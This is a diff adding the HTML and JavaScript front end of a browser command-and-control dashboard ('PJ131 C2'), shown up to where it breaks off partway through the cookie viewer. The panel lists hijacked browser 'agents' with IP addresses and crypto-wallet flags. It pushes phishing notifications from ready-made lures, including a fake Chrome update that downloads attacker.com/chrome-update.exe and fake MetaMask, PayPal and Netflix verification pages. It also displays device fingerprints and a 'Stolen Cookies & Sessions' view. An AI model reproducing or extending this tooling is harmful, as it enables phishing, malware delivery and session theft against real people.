@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrowserC2 - Command & Control Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            background: #0a0e17;
+            color: #00ff41;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #111827;
+            border-bottom: 2px solid #00ff41;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #00ff41;
+        }
+
+        .header .stats {
+            display: flex;
+            gap: 30px;
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff41;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #6b7280;
+            text-transform: uppercase;
+        }
+
+        .container {
+            padding: 40px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .panel {
+            background: #111827;
+            border: 1px solid #00ff41;
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #374151;
+        }
+
+        .panel-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00ff41;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn {
+            background: #00ff41;
+            color: #0a0e17;
+            border: none;
+            padding: 10px 20px;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: #00cc33;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 12px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9ca3af;
+            text-align: left;
+            padding: 12px;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 2px solid #00ff41;
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #374151;
+            font-size: 14px;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .badge-active {
+            background: #10b981;
+            color: #0a0e17;
+        }
+
+        .badge-inactive {
+            background: #6b7280;
+            color: white;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #111827;
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            padding: 32px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            color: #00ff41;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #ef4444;
+            font-size: 28px;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #9ca3af;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            background: #1f2937;
+            border: 1px solid #374151;
+            color: #00ff41;
+            padding: 10px;
+            font-family: inherit;
+            font-size: 14px;
+            border-radius: 4px;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #00ff41;
+            box-shadow: 0 0 0 3px rgba(0, 255, 65, 0.1);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .checkbox-group {
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #374151;
+            border-radius: 4px;
+            padding: 12px;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            margin-bottom: 8px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .checkbox-item:hover {
+            background: #1f2937;
+        }
+
+        .checkbox-item input {
+            width: auto;
+            margin-right: 12px;
+        }
+
+        .template-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .template-card {
+            background: #1f2937;
+            border: 2px solid #374151;
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .template-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+
+        .template-card.selected {
+            border-color: #00ff41;
+            background: rgba(0, 255, 65, 0.1);
+        }
+
+        .template-icon {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .template-name {
+            font-size: 12px;
+            color: #9ca3af;
+            text-transform: uppercase;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #6b7280;
+        }
+
+        .success-message {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid #10b981;
+            color: #10b981;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid #ef4444;
+            color: #ef4444;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+        }
+
+        .full-width {
+            grid-column: 1 / -1;
+        }
+/* Fingerprint Modal Styles */
+        .fingerprint-modal {
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .fingerprint-section {
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .fingerprint-section-title {
+            color: #00ff41;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .fingerprint-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .fingerprint-item {
+            background: #0a0e17;
+            padding: 12px;
+            border-radius: 4px;
+            border-left: 3px solid #00ff41;
+        }
+
+        .fingerprint-label {
+            color: #9ca3af;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .fingerprint-value {
+            color: #00ff41;
+            font-size: 16px;
+            font-weight: bold;
+            word-break: break-all;
+        }
+
+        .fingerprint-fonts {
+            background: #0a0e17;
+            padding: 12px;
+            border-radius: 4px;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .fingerprint-fonts-list {
+            color: #9ca3af;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .fingerprint-badge {
+            display: inline-block;
+            background: #10b981;
+            color: #0a0e17;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .fingerprint-badge.warning {
+            background: #f59e0b;
+        }
+
+        .fingerprint-badge.danger {
+            background: #ef4444;
+        }
+
+        .fingerprint-info {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid #3b82f6;
+            color: #3b82f6;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        /* Cookie Modal Styles */
+        .cookie-modal {
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .cookie-section {
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .cookie-section-title {
+            color: #00ff41;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .cookie-domain {
+            background: #111827;
+            border-left: 3px solid #00ff41;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 4px;
+        }
+
+        .cookie-domain-title {
+            color: #10b981;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+
+        .cookie-item {
+            background: #0a0e17;
+            padding: 10px;
+            margin-bottom: 8px;
+            border-radius: 4px;
+            font-family: 'Monaco', monospace;
+        }
+
+        .cookie-name {
+            color: #f59e0b;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .cookie-value {
+            color: #9ca3af;
+            word-break: break-all;
+            font-size: 13px;
+            padding-left: 10px;
+        }
+
+        .cookie-badges {
+            display: flex;
+            gap: 6px;
+            margin-top: 6px;
+        }
+
+        .cookie-badge {
+            background: #374151;
+            color: #9ca3af;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 10px;
+            text-transform: uppercase;
+        }
+
+        .cookie-tip {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid #10b981;
+            color: #10b981;
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .export-btn {
+            background: #10b981;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 16px;
+        }
+
+        .export-btn:hover {
+            background: #059669;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>[ PJ131 C2 ]</h1>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" id="totalAgents">0</div>
+                <div class="stat-label">Total Agents</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="activeAgents">0</div>
+                <div class="stat-label">Active</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="clickRate">0%</div>
+                <div class="stat-label">Click Rate</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="grid">
+            <div class="panel full-width">
+                <div class="panel-header">
+                    <h2 class="panel-title">Enrolled Agents</h2>
+                    <button class="btn btn-small" onclick="refreshAgents()">🔄 Refresh</button>
+                </div>
+                <div id="agentsTable"></div>
+            </div>
+
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">Send Notification</h2>
+                </div>
+                <button class="btn" style="width: 100%;" onclick="openSendModal()">
+                    📤 Send Push Notification
+                </button>
+            </div>
+
+            <div class="panel">
+                <div class="panel-header">
+                    <h2 class="panel-title">Recent Commands</h2>
+                    <button class="btn btn-small" onclick="refreshCommands()">🔄 Refresh</button>
+                </div>
+                <div id="commandsTable"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="sendModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Send Push Notification</h3>
+                <button class="close-btn" onclick="closeSendModal()">&times;</button>
+            </div>
+
+            <div id="sendResult"></div>
+
+            <div class="form-group">
+                <label>Select Template</label>
+                <div class="template-grid" id="templateGrid"></div>
+            </div>
+
+            <div class="form-group">
+                <label>Select Agents</label>
+                <div class="checkbox-group" id="agentCheckboxes"></div>
+            </div>
+
+            <div class="form-group">
+                <label>Notification Title</label>
+                <input type="text" id="notifTitle" placeholder="Enter notification title">
+            </div>
+
+            <div class="form-group">
+                <label>Notification Message</label>
+                <textarea id="notifMessage" placeholder="Enter notification message"></textarea>
+            </div>
+
+            <div class="form-group">
+                <label>Target URL</label>
+                <input type="text" id="notifUrl" placeholder="https://example.com/phishing">
+            </div>
+
+	    <button class="btn" style="width: 100%;" onclick="debugSend()">
+                📤 Send to Selected Agents
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const templates = [
+            {
+                id: 'chrome',
+                name: 'Chrome Update',
+                icon: '🌐',
+                title: 'Update Required',
+                message: 'Please update Google Chrome to avoid data loss!',
+                url: 'https://attacker.com/chrome-update.exe'
+            },
+            {
+                id: 'security',
+                name: 'Security Alert',
+                icon: '⚠️',
+                title: 'Security Alert',
+                message: 'Unusual activity detected on your account. Verify now!',
+                url: 'https://attacker.com/verify'
+            },
+            {
+                id: 'metamask',
+                name: 'MetaMask',
+                icon: '🦊',
+                title: 'MetaMask Security',
+                message: 'Your wallet needs verification to prevent unauthorized access',
+                url: 'https://attacker.com/metamask-verify'
+            },
+            {
+                id: 'netflix',
+                name: 'Netflix',
+                icon: '🎬',
+                title: 'Netflix Payment Failed',
+                message: 'Your payment method was declined. Update now to continue.',
+                url: 'https://attacker.com/netflix-payment'
+            },
+            {
+                id: 'paypal',
+                name: 'PayPal',
+                icon: '💳',
+                title: 'PayPal Security',
+                message: 'We detected unusual login activity. Verify your account.',
+                url: 'https://attacker.com/paypal-verify'
+            },
+            {
+                id: 'custom',
+                name: 'Custom',
+                icon: '✏️',
+                title: '',
+                message: '',
+                url: ''
+            }
+        ];
+
+        let selectedTemplate = null;
+        let agents = [];
+        let commands = [];
+
+        async function init() {
+            console.log('[Dashboard] Initializing...');
+            await loadStats();
+            await refreshAgents();
+            await refreshCommands();
+            renderTemplates();
+            
+            setInterval(async () => {
+                await loadStats();
+                await refreshAgents();
+                await refreshCommands();
+            }, 10000);
+            
+            console.log('[Dashboard] Ready!');
+        }
+
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
+                
+                document.getElementById('totalAgents').textContent = stats.total_agents;
+                document.getElementById('activeAgents').textContent = stats.active_agents;
+                document.getElementById('clickRate').textContent = stats.click_rate + '%';
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+
+        async function refreshAgents() {
+            try {
+                const response = await fetch('/api/agents');
+                agents = await response.json();
+                console.log('[Dashboard] Loaded agents:', agents.length);
+                renderAgentsTable();
+            } catch (error) {
+                console.error('Error loading agents:', error);
+            }
+        }
+
+        async function refreshCommands() {
+            try {
+                const response = await fetch('/api/commands');
+                commands = await response.json();
+                renderCommandsTable();
+            } catch (error) {
+                console.error('Error loading commands:', error);
+            }
+        }
+
+        function renderAgentsTable() {
+            const container = document.getElementById('agentsTable');
+            
+            if (agents.length === 0) {
+                container.innerHTML = '<div class="empty-state">No agents enrolled yet</div>';
+                return;
+            }
+
+            let html = `
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Agent ID</th>
+                            <th>Browser</th>
+                            <th>OS</th>
+                            <th>IP Address</th>
+                            <th>Crypto Wallet</th>
+                            <th>Last Seen</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            agents.forEach(agent => {
+                const lastSeen = new Date(agent.last_seen).toLocaleString();
+                const wallet = agent.has_crypto_wallet ? '🦊 Yes' : 'No';
+                
+                html += `
+                    <tr>
+                        <td><code>${agent.agent_id}</code></td>
+                        <td>${agent.browser || 'Unknown'}</td>
+                        <td>${agent.os || 'Unknown'}</td>
+                        <td>${agent.ip_address}</td>
+                        <td>${wallet}</td>
+                        <td>${lastSeen}</td>
+                        <td><span class="badge ${agent.is_active ? 'badge-active' : 'badge-inactive'}">${agent.is_active ? 'Active' : 'Inactive'}</span></td>
+                        <td>
+                            <button class="btn btn-small" style="background: #10b981; padding: 4px 8px; margin-right: 4px;" onclick="viewFingerprint(${agent.id})">🔍 Details</button>
+                            <button class="btn btn-small" style="background: #f59e0b; padding: 4px 8px; margin-right: 4px;" onclick="viewCookies(${agent.id})">🍪 Cookies</button>
+                            <button class="btn btn-small" style="background: #ef4444; padding: 4px 8px;" onclick="deleteAgent(${agent.id}, '${agent.agent_id}')">🗑️ Kill</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            container.innerHTML = html;
+        }
+
+        function renderCommandsTable() {
+            const container = document.getElementById('commandsTable');
+            
+            if (commands.length === 0) {
+                container.innerHTML = '<div class="empty-state">No commands sent yet</div>';
+                return;
+            }
+
+            let html = `
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Type</th>
+                            <th>Title</th>
+                            <th>Sent</th>
+                            <th>Clicked</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            commands.slice(0, 10).forEach(cmd => {
+                const sentAt = new Date(cmd.sent_at).toLocaleString();
+                
+                html += `
+                    <tr>
+                        <td><span class="badge badge-active">${cmd.command_type}</span></td>
+                        <td>${cmd.title}</td>
+                        <td>${sentAt}</td>
+                        <td>${cmd.clicked ? '✓ Yes' : '✗ No'}</td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            container.innerHTML = html;
+        }
+
+        function renderTemplates() {
+            const container = document.getElementById('templateGrid');
+            
+            let html = '';
+            templates.forEach(template => {
+                html += `
+                    <div class="template-card" onclick="selectTemplate('${template.id}')">
+                        <div class="template-icon">${template.icon}</div>
+                        <div class="template-name">${template.name}</div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        function selectTemplate(templateId) {
+            selectedTemplate = templates.find(t => t.id === templateId);
+            
+            document.querySelectorAll('.template-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+            
+            document.getElementById('notifTitle').value = selectedTemplate.title;
+            document.getElementById('notifMessage').value = selectedTemplate.message;
+            document.getElementById('notifUrl').value = selectedTemplate.url;
+        }
+
+        function openSendModal() {
+            const container = document.getElementById('agentCheckboxes');
+            
+            if (agents.length === 0) {
+                container.innerHTML = '<div class="empty-state">No agents available</div>';
+            } else {
+                let html = '';
+                agents.forEach(agent => {
+                    html += `
+                        <label class="checkbox-item">
+                            <input type="checkbox" value="${agent.id}">
+                            <span>${agent.browser} on ${agent.os} - ${agent.ip_address}</span>
+                        </label>
+                    `;
+                });
+                container.innerHTML = html;
+            }
+            
+            document.getElementById('sendModal').classList.add('active');
+        }
+
+        function closeSendModal() {
+            document.getElementById('sendModal').classList.remove('active');
+            document.getElementById('sendResult').innerHTML = '';
+        }
+
+        async function sendNotification() {
+            const title = document.getElementById('notifTitle').value;
+            const message = document.getElementById('notifMessage').value;
+            const url = document.getElementById('notifUrl').value;
+            
+            const checkboxes = document.querySelectorAll('#agentCheckboxes input[type="checkbox"]:checked');
+            const agentIds = Array.from(checkboxes).map(cb => parseInt(cb.value));
+            
+            if (agentIds.length === 0) {
+                showResult('Please select at least one agent', 'error');
+                return;
+            }
+            
+            if (!title || !message) {
+                showResult('Please fill in title and message', 'error');
+                return;
+            }
+
+            try {
+                showResult('Sending notifications...', 'success');
+                
+                const response = await fetch('/api/send_notification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        agent_ids: agentIds,
+                        type: 'phishing',
+                        title: title,
+                        message: message,
+                        url: url
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    showResult(`✓ Sent to ${result.total_sent} agent(s)`, 'success');
+                    
+                    await refreshCommands();
+                    await loadStats();
+                    
+                    setTimeout(() => {
+                        closeSendModal();
+                    }, 2000);
+                } else {
+                    showResult('Failed to send notifications', 'error');
+                }
+            } catch (error) {
+                console.error('Error sending notification:', error);
+                showResult('Error: ' + error.message, 'error');
+            }
+        }
+
+        function showResult(message, type) {
+            const container = document.getElementById('sendResult');
+            container.innerHTML = `<div class="${type}-message">${message}</div>`;
+        }
+
+        async function deleteAgent(agentId, agentName) {
+            if (!confirm(`Are you sure you want to kill agent ${agentName}?`)) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/agents/${agentId}`, {
+                    method: 'DELETE'
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    console.log(`Agent ${agentName} deleted`);
+                    await refreshAgents();
+                    await loadStats();
+                } else {
+                    alert('Failed to delete agent: ' + result.error);
+                }
+            } catch (error) {
+                console.error('Error deleting agent:', error);
+                alert('Error deleting agent: ' + error.message);
+            }
+        }
+async function viewFingerprint(agentId) {
+            try {
+                const response = await fetch(`/api/fingerprints/${agentId}`);
+                const fingerprints = await response.json();
+                
+                if (fingerprints.length === 0) {
+                    alert('No enhanced fingerprint data available for this agent.');
+                    return;
+                }
+                
+                const fp = fingerprints[0];
+                
+                // Create modal
+                const modal = document.createElement('div');
+                modal.className = 'modal active';
+                modal.innerHTML = `
+                    <div class="modal-content fingerprint-modal" style="max-width: 12500px; width: 95%;">
+                        <div class="modal-header">
+                            <h3 class="modal-title">🔍 Enhanced Fingerprint</h3>
+                            <button class="close-btn" onclick="this.closest('.modal').remove()">&times;</button>
+                        </div>
+                        
+                        <div id="fingerprintContent"></div>
+                    </div>
+                `;
+                
+                document.body.appendChild(modal);
+                
+                // Build content
+                let content = '';
+                
+                // System Info Section
+                content += `
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-section-title">
+                            <span>💻</span>
+                            <span>System Information</span>
+                        </div>
+                        <div class="fingerprint-grid">
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Platform</div>
+                                <div class="fingerprint-value">${fp.platform || 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">CPU Cores</div>
+                                <div class="fingerprint-value">${fp.cpu_cores || 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Device Memory</div>
+                                <div class="fingerprint-value">${fp.device_memory_gb ? fp.device_memory_gb + ' GB' : 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">JS Heap Size</div>
+                                <div class="fingerprint-value">${fp.js_heap_size_mb ? fp.js_heap_size_mb.toFixed(2) + ' MB' : 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Touch Support</div>
+                                <div class="fingerprint-value">${fp.touch_support ? '✅ Yes' : '❌ No'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Storage Quota</div>
+                                <div class="fingerprint-value">${fp.storage_quota_gb ? fp.storage_quota_gb.toFixed(2) + ' GB' : 'Unknown'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Graphics Section
+                content += `
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-section-title">
+                            <span>🎮</span>
+                            <span>Graphics & Hardware</span>
+                        </div>
+                        <div class="fingerprint-grid">
+                            <div class="fingerprint-item" style="grid-column: 1 / -1;">
+                                <div class="fingerprint-label">WebGL Vendor</div>
+                                <div class="fingerprint-value">${fp.webgl_vendor || 'N/A'}</div>
+                            </div>
+                            <div class="fingerprint-item" style="grid-column: 1 / -1;">
+                                <div class="fingerprint-label">WebGL Renderer (GPU)</div>
+                                <div class="fingerprint-value">${fp.webgl_renderer || 'N/A'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Canvas Fingerprint</div>
+                                <div class="fingerprint-value" style="font-family: monospace;">${fp.canvas_hash || 'N/A'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Audio Fingerprint</div>
+                                <div class="fingerprint-value" style="font-family: monospace;">${fp.audio_hash || 'N/A'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Media Devices Section
+                const mediaInfo = [];
+                if (fp.has_webcam) mediaInfo.push('<span class="fingerprint-badge">📹 Webcam</span>');
+                if (fp.has_microphone) mediaInfo.push('<span class="fingerprint-badge">🎤 Microphone</span>');
+                if (!fp.has_webcam && !fp.has_microphone) mediaInfo.push('<span class="fingerprint-badge warning">⚠️ No Devices</span>');
+                
+                content += `
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-section-title">
+                            <span>🎥</span>
+                            <span>Media Devices</span>
+                        </div>
+                        <div class="fingerprint-grid">
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Total Devices</div>
+                                <div class="fingerprint-value">${fp.media_devices_count || 0}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Available</div>
+                                <div class="fingerprint-value">${mediaInfo.join(' ')}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Network & Battery Section
+                let batteryHTML = '';
+                if (fp.battery_level !== null) {
+                    const batteryPercent = (fp.battery_level * 100).toFixed(0);
+                    const batteryStatus = fp.battery_charging ? '🔌 Charging' : '🔋 Not Charging';
+                    const batteryClass = fp.battery_level < 0.2 ? 'danger' : (fp.battery_level < 0.5 ? 'warning' : '');
+                    
+                    batteryHTML = `
+                        <div class="fingerprint-item">
+                            <div class="fingerprint-label">Battery</div>
+                            <div class="fingerprint-value">
+                                <span class="fingerprint-badge ${batteryClass}">${batteryPercent}%</span>
+                                <span style="color: #9ca3af; font-size: 14px;">${batteryStatus}</span>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                content += `
+                    <div class="fingerprint-section">
+                        <div class="fingerprint-section-title">
+                            <span>📡</span>
+                            <span>Network & Power</span>
+                        </div>
+                        <div class="fingerprint-grid">
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Network Type</div>
+                                <div class="fingerprint-value">${fp.network_type || 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Download Speed</div>
+                                <div class="fingerprint-value">${fp.network_downlink ? fp.network_downlink + ' Mbps' : 'Unknown'}</div>
+                            </div>
+                            <div class="fingerprint-item">
+                                <div class="fingerprint-label">Network RTT</div>
+                                <div class="fingerprint-value">${fp.network_rtt ? fp.network_rtt + ' ms' : 'Unknown'}</div>
+                            </div>
+                            ${batteryHTML}
+                        </div>
+                    </div>
+                `;
+                
+                // Fonts Section
+                if (fp.fonts_detected) {
+                    try {
+                        const fonts = JSON.parse(fp.fonts_detected);
+                        content += `
+                            <div class="fingerprint-section">
+                                <div class="fingerprint-section-title">
+                                    <span>🔤</span>
+                                    <span>Detected Fonts (${fonts.length})</span>
+                                </div>
+                                <div class="fingerprint-fonts">
+                                    <div class="fingerprint-fonts-list">
+                                        ${fonts.join(', ')}
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    } catch (e) {
+                        console.error('Error parsing fonts:', e);
+                    }
+                }
+                
+                // Info Section
+                const collectedDate = new Date(fp.collected_at).toLocaleString();
+                content += `
+                    <div class="fingerprint-info">
+                        <strong>ℹ️ Intelligence Summary:</strong><br><br>
+                        <strong>Device Profile:</strong> ${fp.platform || 'Unknown'} system with ${fp.cpu_cores || '?'} cores and ${fp.device_memory_gb || '?'} GB RAM<br>
+                        <strong>Graphics:</strong> ${fp.webgl_renderer || 'Unknown GPU'}<br>
+                        <strong>Capabilities:</strong> ${fp.has_webcam ? 'Webcam, ' : ''}${fp.has_microphone ? 'Microphone, ' : ''}Touch Support: ${fp.touch_support ? 'Yes' : 'No'}<br>
+                        <strong>Network:</strong> ${fp.network_type || 'Unknown'} connection${fp.network_downlink ? ' @ ' + fp.network_downlink + ' Mbps' : ''}<br>
+                        <strong>Fingerprint IDs:</strong> Canvas: ${fp.canvas_hash || 'N/A'}, Audio: ${fp.audio_hash || 'N/A'}<br><br>
+                        <strong>📅 Data Collected:</strong> ${collectedDate}
+                    </div>
+                `;
+                
+                modal.querySelector('#fingerprintContent').innerHTML = content;
+                
+                // Close on background click
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        modal.remove();
+                    }
+                });
+                
+            } catch (error) {
+                console.error('Error loading fingerprint:', error);
+                alert('Error loading fingerprint data');
+            }
+        }
+	async function viewCookies(agentId) {
+            try {
+                const cookieResponse = await fetch(`/api/cookies/${agentId}`);
+                const cookies = await cookieResponse.json();
+                
+                const storageResponse = await fetch(`/api/storage/${agentId}`);
+                const storage = await storageResponse.json();
+                
+                if (cookies.length === 0 && storage.length === 0) {
+                    alert('No stolen cookies or storage data for this agent yet.');
+                    return;
+                }
+                
+                // Create modal
+                const modal = document.createElement('div');
+                modal.className = 'modal active';
+                modal.innerHTML = `
+                    <div class="modal-content cookie-modal" style="max-width: 12500px; width: 95%;">
+                        <div class="modal-header">
+                            <h3 class="modal-title">🍪 Stolen Cookies & Sessions</h3>
+                            <button class="close-btn" onclick="this.closest('.modal').remove()">&times;</button>
+                        </div>
+                        
+                        <div id="cookieContent"></div>
+                    </div>
+                `;
+                
+                document.body.appendChild(modal);
+                
+                // Build content
+                let content = '';
+                
+                // Cookies section
+                if (cookies.length > 0) {
+                    content += `
+                        <div class="cookie-section">
+                            <div class="cookie-section-title">
+                                <span>📦</span>
+                                <span>HTTP Cookies (${cookies.length})</span>
+                            </div>
+                    `;
+                    
+                    const cookiesByDomain = {};
+                    cookies.forEach(cookie => {
+                        if (!cookiesByDomain[cookie.domain]) {
+                            cookiesByDomain[cookie.domain] = [];
+                        }
+                        cookiesByDomain[cookie.domain].push(cookie);
+                    });
+                    
+                    Object.entries(cookiesByDomain).forEach(([domain, domainCookies]) => {
+                        content += `
+                            <div class="cookie-domain">
+                                <div class="cookie-domain-title">🌐 ${domain}</div>
+                        `;
+                        
+                        domainCookies.forEach(cookie => {
+                            const shortValue = cookie.value.length > 150 
+                                ? cookie.value.substring(0, 150) + '...' 
+                                : cookie.value;
+                            
+                            content += `
+                                <div class="cookie-item">
+                                    <div class="cookie-name">${cookie.name}</div>
+                                    <div class="cookie-value">${shortValue}</div>
+                                    <div class="cookie-badges">
